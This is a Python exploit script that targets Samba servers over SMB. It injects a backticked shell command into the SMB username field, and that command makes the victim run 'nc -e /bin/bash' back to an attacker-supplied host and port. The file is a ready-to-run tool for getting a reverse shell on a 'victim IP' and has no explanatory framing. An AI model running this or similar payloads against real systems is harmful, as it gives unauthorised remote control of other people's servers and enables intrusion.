#!/usr/bin/python3

from smb.SMBConnection import SMBConnection
import sys
import signal
import argparse 

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

parser = argparse.ArgumentParser()
parser.add_argument("--lhost", "-lh", type=str, help="local host", required=True)
parser.add_argument("--lport", "-lp", type=str, help="local port", required=True)
parser.add_argument("--rhost", "-rh", type=str, help="victim IP", required=True)
parser.add_argument("--rport", "-rp", type=str, help="victim port", required=True)
args = parser.parse_args()

def autopwn(lhost, lport, rhost, rport):
    payload = "`nohup nc -e /bin/bash {} {} &`".format(lhost, lport)
    username = "/=" + payload
    conn = SMBConnection(username, "", "", "")
    try:
        conn.connect(rhost, int(rport), timeout=2)
    except:
        print("[+] Check your netcat listener")

if __name__ == '__main__':
    lhost = args.lhost
    lport = args.lport
    rhost = args.rhost
    rport = args.rport
    print("[+] Connecting")
    autopwn(lhost, lport, rhost, rport)
